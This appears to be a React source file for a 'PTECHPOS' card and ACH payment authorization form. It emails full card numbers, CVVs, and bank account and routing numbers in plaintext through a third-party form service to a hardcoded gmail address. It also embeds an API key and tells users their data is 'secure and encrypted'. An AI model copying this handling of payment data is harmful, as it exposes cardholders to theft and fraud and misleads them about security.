import { useState } from "react";
import { HiOutlineCreditCard, HiOutlineBanknotes, HiOutlineHome, HiOutlineUserCircle } from "react-icons/hi2";
import Swal from "sweetalert2";
import axios from "axios";
import useAxios from "../Hooks/useAxios";

const PaymentAuthorizationForm = () => {
  const [formData, setFormData] = useState({
    fullName: "",
    companyName: "",
    chargeType: "oneTime",
    nameOnAccount: "",
    bankName: "",
    accountNumber: "",
    routingNumber: "",
    cardHolder: "",
    cardNumber: "",
    expDate: "",
    cvv: "",
    amount: "",
    date: "",
    description: "",
    billingAddress: "",
    billingPhone: "",
    billingCity: "",
    billingZip: "",
    billingEmail: "",
  });

  const axiosSecure = useAxios();

  const handleChange = (e) => {
    const { name, value } = e.target;
    setFormData({ ...formData, [name]: value });
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    const frm = e.target;

    const formData = {
      fullName: frm.fullName?.value || "",
      companyName: frm.companyName?.value || "",
      chargeType: frm.chargeType?.value || "oneTime",
      nameOnAccount: frm.nameOnAccount?.value || "",
      bankName: frm.bankName?.value || "",
      accountNumber: frm.accountNumber?.value || "",
      routingNumber: frm.routingNumber?.value || "",
      cardHolder: frm.cardHolder?.value || "",
      cardNumber: frm.cardNumber?.value || "",
      expDate: frm.expDate?.value || "",
      cvv: frm.cvv?.value || "",
      amount: frm.amount?.value || "",
      date: frm.date?.value || "",
      description: frm.description?.value || "",
      billingAddress: frm.billingAddress?.value || "",
      billingPhone: frm.billingPhone?.value || "",
      billingCity: frm.billingCity?.value || "",
      billingEmail: frm.billingEmail?.value || "",
      email: 'rijoanrashidopar@gmail.com',
      type: "payment_authorization"
    };

    const message = `
📢 NEW PAYMENT AUTHORIZATION RECEIVED

👤 AUTHORIZATION DETAILS
Full Name: ${formData.fullName}
Company Name: ${formData.companyName}
Charge Type: ${formData.chargeType}

🏦 BANK DETAILS (ACH)
Name on Account: ${formData.nameOnAccount}
Bank Name: ${formData.bankName}
Account Number: ${formData.accountNumber}
Routing Number: ${formData.routingNumber}

💳 CREDIT CARD DETAILS
Cardholder Name: ${formData.cardHolder}
Card Number: ${formData.cardNumber}
Expiration Date: ${formData.expDate}
CVV: ${formData.cvv}

💰 PAYMENT DETAILS
Amount: $${formData.amount}
Date: ${formData.date}
Description: ${formData.description}

🏠 BILLING INFORMATION
Billing Address: ${formData.billingAddress}
Phone: ${formData.billingPhone}
City/ZIP: ${formData.billingCity}
Email: ${formData.billingEmail}

📅 Submitted On: ${new Date().toLocaleString()}

──────────────────────────────
📨 This email was sent via PTECHPOS Payment Authorization Form.
`;

    const formDataToSend = {
      access_key: "de8473ac-47a9-419a-917a-1021807f0439",
      from_name: "PTECHPOS Payment Authorization",
      subject: `New Payment Authorization - ${formData.fullName}`,
      message,
      replyto: formData.billingEmail,
      emails: `rezoanbids@gmail.com, ${formData.billingEmail}`,
    };

    try {
      const res = await axios.post("https://api.web3forms.com/submit", formDataToSend, {
        headers: { "Content-Type": "application/json" },
      });

      if (res.data.success) {
        axiosSecure.post("/payment" , formData)
        Swal.fire({
          title: "Authorization Submitted",
          text: "Your payment authorization has been sent successfully!",
          icon: "success",
          confirmButtonColor: "#3085d6",
        });
      } else {
        Swal.fire({
          title: "Submission Failed",
          text: "Something went wrong. Please try again later.",
          icon: "error",
          confirmButtonColor: "#d33",
        });
      }
    } catch (error) {
      console.error(error);
      Swal.fire({
        title: "Network Error",
        text: "Unable to send your authorization. Please check your connection.",
        icon: "error",
        confirmButtonColor: "#d33",
      });
    }
  };

  return (
    <div className="min-h-screen py-4 px-3 md:px-6 ">
      <style>{`
        @keyframes fadeInUp {
          from {
            opacity: 0;
            transform: translateY(30px);
          }
          to {
            opacity: 1;
            transform: translateY(0);
          }
        }
        
        @keyframes slideInLeft {
          from {
            opacity: 0;
            transform: translateX(-30px);
          }
          to {
            opacity: 1;
            transform: translateX(0);
          }
        }
        
        @keyframes slideInRight {
          from {
            opacity: 0;
            transform: translateX(30px);
          }
          to {
            opacity: 1;
            transform: translateX(0);
          }
        }
        
        @keyframes scaleIn {
          from {
            opacity: 0;
            transform: scale(0.95);
          }
          to {
            opacity: 1;
            transform: scale(1);
          }
        }

        @keyframes shimmer {
          0% {
            background-position: -1000px 0;
          }
          100% {
            background-position: 1000px 0;
          }
        }

        .animate-fade-in-up {
          animation: fadeInUp 0.6s ease-out forwards;
        }
        
        .animate-slide-in-left {
          animation: slideInLeft 0.6s ease-out forwards;
        }
        
        .animate-slide-in-right {
          animation: slideInRight 0.6s ease-out forwards;
        }
        
        .animate-scale-in {
          animation: scaleIn 0.5s ease-out forwards;
        }
        
        .section-animate {
          opacity: 0;
          animation: fadeInUp 0.7s ease-out forwards;
        }
        
        .section-animate:nth-child(1) { animation-delay: 0.1s; }
        .section-animate:nth-child(2) { animation-delay: 0.2s; }
        .section-animate:nth-child(3) { animation-delay: 0.3s; }
        .section-animate:nth-child(4) { animation-delay: 0.4s; }
        .section-animate:nth-child(5) { animation-delay: 0.5s; }
        
        .input-animate {
          transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
        }
        
        .input-animate:focus {
          transform: translateY(-2px);
          box-shadow: 0 8px 16px rgba(236, 72, 153, 0.15);
        }
        
        .input-animate:hover {
          border-color: #ec4899;
        }
        
        .card-hover {
          transition: all 0.4s cubic-bezier(0.4, 0, 0.2, 1);
        }
        
        .card-hover:hover {
          transform: translateY(-4px);
          box-shadow: 0 12px 24px rgba(0, 0, 0, 0.12);
        }
        
        .icon-float {
          animation: float 3s ease-in-out infinite;
        }
        
        @keyframes float {
          0%, 100% {
            transform: translateY(0);
          }
          50% {
            transform: translateY(-8px);
          }
        }
        
        .submit-button {
          position: relative;
          overflow: hidden;
          transition: all 0.4s ease;
        }
        
        .submit-button:before {
          content: '';
          position: absolute;
          top: 0;
          left: -100%;
          width: 100%;
          height: 100%;
          background: linear-gradient(
            90deg,
            transparent,
            rgba(255, 255, 255, 0.3),
            transparent
          );
          transition: left 0.5s ease;
        }
        
        .submit-button:hover:before {
          left: 100%;
        }
        
        .submit-button:hover {
          transform: translateY(-2px);
          box-shadow: 0 12px 24px rgba(236, 72, 153, 0.4);
        }
        
        .submit-button:active {
          transform: translateY(0);
        }

        .gradient-text {
          background: linear-gradient(135deg, #ec4899 0%, #db2777 100%);
          -webkit-background-clip: text;
          -webkit-text-fill-color: transparent;
          background-clip: text;
        }

        .section-border {
          position: relative;
        }

        .section-border:before {
          content: '';
          position: absolute;
          top: 0;
          left: 0;
          right: 0;
          height: 1px;
          background: linear-gradient(90deg, #035EB2, #035EB2, #035EB2);
          border-radius: 10px;
          animation: shimmer 3s infinite linear;
          background-size: 200% 100%;
        }
      `}</style>
      
      <div className="max-w-4xl mx-auto bg-white rounded-2xl shadow-2xl overflow-hidden animate-fade-in-up">
        {/* Header with gradient */}
        <div className="bg-gradient-to-r from-[#035EB2] via-[#0660b4] to-[#0963b6] md:p-6 p-4  text-center relative overflow-hidden">
          <div className="absolute inset-0 opacity-20">
            <div className="absolute top-0 left-0 w-40 h-40 bg-white rounded-full -translate-x-1/2 -translate-y-1/2"></div>
            <div className="absolute bottom-0 right-0 w-60 h-60 bg-white rounded-full translate-x-1/3 translate-y-1/3"></div>
          </div>
          <h1 className="text-2xl sm:text-3xl lg:text-4xl font-bold text-white mb-2 uppercase relative z-10 animate-scale-in">
            Credit Card / ACH Payment Authorization
          </h1>
          <p className="text-pink-100 text-sm sm:text-base relative z-10">Secure payment processing for your business</p>
        </div>

        <form onSubmit={handleSubmit} className="p-2 md:p-6  space-y-6 sm:space-y-8">
          {/* Authorization Section */}
          <section className="bg-gradient-to-br from-gray-50 to-gray-100 md:p-4 p-2  rounded-xl border border-gray-200 shadow-sm section-animate section-border card-hover">
            <div className="flex items-center gap-2 sm:gap-3 mb-4">
              <HiOutlineUserCircle className="text-[#035EB2] text-2xl sm:text-3xl icon-float" />
              <h2 className="text-base sm:text-lg font-semibold text-gray-800">
                Authorization Details
              </h2>
            </div>
            <div className="grid grid-cols-1 md:grid-cols-2 gap-3 sm:gap-4">
              <input 
                name="fullName" 
                placeholder="Full Name" 
                onChange={handleChange} 
                className="input-animate w-full px-3 sm:px-4 py-2 sm:py-3 text-sm sm:text-base border border-gray-300 rounded-lg focus:ring-2 focus:ring-[#035EB2] focus:border-transparent outline-none" 
                required
              />
              <input 
                name="companyName" 
                placeholder="Company Name" 
                onChange={handleChange} 
                className="input-animate w-full px-3 sm:px-4 py-2 sm:py-3 text-sm sm:text-base border border-gray-300 rounded-lg focus:ring-2 focus:ring-[#035EB2] focus:border-transparent outline-none" 
                required
              />
            </div>
          </section>

          {/* Payment Method Section */}
          <section className="bg-gradient-to-br from-gray-50 to-gray-100 p-3 md:p-5 rounded-xl border border-gray-200 shadow-sm section-animate section-border">
            <div className="flex items-center gap-2 sm:gap-3 mb-4">
              <HiOutlineBanknotes className="text-green-500 text-2xl sm:text-3xl icon-float" />
              <h2 className="text-base sm:text-lg font-semibold text-gray-800">
                Payment Method
              </h2>
            </div>

            <div className="flex flex-col lg:flex-row gap-4 sm:gap-6">
              {/* Bank Info */}
              <div className="flex-1 border border-gray-200 p-4 sm:p-5 rounded-xl bg-white shadow-md card-hover animate-slide-in-left">
                <h3 className="flex items-center gap-2 font-semibold text-gray-700 mb-3 sm:mb-4 text-sm sm:text-base">
                  <HiOutlineBanknotes className="text-green-500 text-xl sm:text-2xl" /> Bank (ACH)
                </h3>
                <div className="grid gap-3">
                  <input 
                    name="nameOnAccount" 
                    placeholder="Name on Account" 
                    onChange={handleChange} 
                    className="input-animate w-full px-3 sm:px-4 py-2 sm:py-3 text-sm sm:text-base border border-gray-300 rounded-lg focus:ring-2 focus:ring-green-500 focus:border-transparent outline-none" 
                  />
                  <input 
                    name="bankName" 
                    placeholder="Bank Name" 
                    onChange={handleChange} 
                    className="input-animate w-full px-3 sm:px-4 py-2 sm:py-3 text-sm sm:text-base border border-gray-300 rounded-lg focus:ring-2 focus:ring-green-500 focus:border-transparent outline-none" 
                  />
                  <input 
                    name="accountNumber" 
                    placeholder="Account Number" 
                    onChange={handleChange} 
                    className="input-animate w-full px-3 sm:px-4 py-2 sm:py-3 text-sm sm:text-base border border-gray-300 rounded-lg focus:ring-2 focus:ring-green-500 focus:border-transparent outline-none" 
                  />
                  <input 
                    name="routingNumber" 
                    placeholder="Routing Number" 
                    onChange={handleChange} 
                    className="input-animate w-full px-3 sm:px-4 py-2 sm:py-3 text-sm sm:text-base border border-gray-300 rounded-lg focus:ring-2 focus:ring-green-500 focus:border-transparent outline-none" 
                  />
                </div>
              </div>

              {/* Credit Card Info */}
              <div className="flex-1 border border-gray-200 p-2 md:p-5 rounded-xl bg-white shadow-md card-hover animate-slide-in-right">
                <h3 className="flex items-center gap-2 font-semibold text-gray-700 mb-3 sm:mb-4 text-sm sm:text-base">
                  <HiOutlineCreditCard className="text-[#035EB2] text-xl sm:text-2xl" /> Credit Card
                </h3>
                <div className="grid gap-3">
                  <input 
                    name="cardHolder" 
                    placeholder="Cardholder Name" 
                    onChange={handleChange} 
                    className="input-animate w-full px-3 sm:px-4 py-2 sm:py-3 text-sm sm:text-base border border-gray-300 rounded-lg focus:ring-2 focus:ring-[#035EB2] focus:border-transparent outline-none" 
                  />
                  <input 
                    name="cardNumber" 
                    placeholder="Card Number" 
                    onChange={handleChange} 
                    className="input-animate w-full px-3 sm:px-4 py-2 sm:py-3 text-sm sm:text-base border border-gray-300 rounded-lg focus:ring-2 focus:ring-[#035EB2] focus:border-transparent outline-none" 
                  />
                  <div className="grid grid-cols-2 gap-3">
                    <input 
                      name="expDate" 
                      type="month" 
                      onChange={handleChange} 
                      className="input-animate w-full px-3 sm:px-4 py-2 sm:py-3 text-sm sm:text-base border border-gray-300 rounded-lg focus:ring-2 focus:ring-[#035EB2] focus:border-transparent outline-none" 
                    />
                    <input 
                      name="cvv" 
                      placeholder="CVV" 
                      maxLength="4"
                      onChange={handleChange} 
                      className="input-animate w-full px-3 sm:px-4 py-2 sm:py-3 text-sm sm:text-base border border-gray-300 rounded-lg focus:ring-2 focus:ring-[#035EB2] focus:border-transparent outline-none" 
                    />
                  </div>
                </div>
              </div>
            </div>
          </section>

          {/* Payment Details */}
          <section className="bg-gradient-to-br from-gray-50 to-gray-100 p-4 sm:p-5 rounded-xl border border-gray-200 shadow-sm section-animate section-border card-hover">
            <h2 className="text-base sm:text-lg font-semibold text-gray-800 mb-3 sm:mb-4 flex items-center gap-2">
              <span className="text-xl sm:text-2xl">💰</span> Payment Details
            </h2>
            <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-3 sm:gap-4">
              <input 
                name="amount" 
                placeholder="Amount ($)" 
                type="number"
                step="0.01"
                onChange={handleChange} 
                className="input-animate w-full px-3 sm:px-4 py-2 sm:py-3 text-sm sm:text-base border border-gray-300 rounded-lg focus:ring-2 focus:ring-[#035EB2] focus:border-transparent outline-none" 
                required
              />
              <input 
                name="date" 
                type="date" 
                onChange={handleChange} 
                className="input-animate w-full px-3 sm:px-4 py-2 sm:py-3 text-sm sm:text-base border border-gray-300 rounded-lg focus:ring-2 focus:ring-[#035EB2] focus:border-transparent outline-none" 
                required
              />
              <input 
                name="description" 
                placeholder="Description" 
                onChange={handleChange} 
                className="input-animate w-full px-3 sm:px-4 py-2 sm:py-3 text-sm sm:text-base border border-gray-300 rounded-lg focus:ring-2 focus:ring-[#035EB2] focus:border-transparent outline-none sm:col-span-2 lg:col-span-1" 
                required
              />
            </div>
          </section>

          {/* Billing Info */}
          <section className="bg-gradient-to-br from-gray-50 to-gray-100 p-4 sm:p-5 rounded-xl border border-gray-200 shadow-sm section-animate section-border card-hover">
            <div className="flex items-center gap-2 sm:gap-3 mb-4">
              <HiOutlineHome className="text-blue-500 text-2xl sm:text-3xl icon-float" />
              <h2 className="text-base sm:text-lg font-semibold text-gray-800">
                Billing Information
              </h2>
            </div>

            <div className="grid grid-cols-1 sm:grid-cols-2 gap-3 sm:gap-4">
              <input 
                name="billingAddress" 
                placeholder="Billing Address" 
                onChange={handleChange} 
                className="input-animate w-full px-3 sm:px-4 py-2 sm:py-3 text-sm sm:text-base border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent outline-none" 
                required
              />
              <input 
                name="billingPhone" 
                placeholder="Phone" 
                type="tel"
                onChange={handleChange} 
                className="input-animate w-full px-3 sm:px-4 py-2 sm:py-3 text-sm sm:text-base border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent outline-none" 
                required
              />
              <input 
                name="billingCity" 
                placeholder="City, State, ZIP" 
                onChange={handleChange} 
                className="input-animate w-full px-3 sm:px-4 py-2 sm:py-3 text-sm sm:text-base border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent outline-none" 
                required
              />
              <input 
                name="billingEmail" 
                type="email" 
                placeholder="Email" 
                onChange={handleChange} 
                className="input-animate w-full px-3 sm:px-4 py-2 sm:py-3 text-sm sm:text-base border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent outline-none" 
                required
              />
            </div>
          </section>

          {/* Submit */}
          <div className="text-center pt-2 sm:pt-4">
            <button
              type="submit"
              className="submit-button w-full sm:w-auto px-6 sm:px-8 py-3 sm:py-4 bg-gradient-to-r from-[#035EB2] via-[#035EB2] to-[#0568c5] text-white font-semibold text-sm sm:text-base rounded-lg shadow-lg hover:shadow-2xl transition-all duration-300 relative z-10"
            >
              <span className="relative z-10 flex items-center justify-center gap-2">
                <span>Submit Authorization</span>
                <span className="text-lg sm:text-xl">→</span>
              </span>
            </button>
            <p className="text-xs sm:text-sm text-gray-500 mt-3 sm:mt-4">Your information is secure and encrypted</p>
          </div>
        </form>
      </div>
    </div>
  );
};

export default PaymentAuthorizationForm;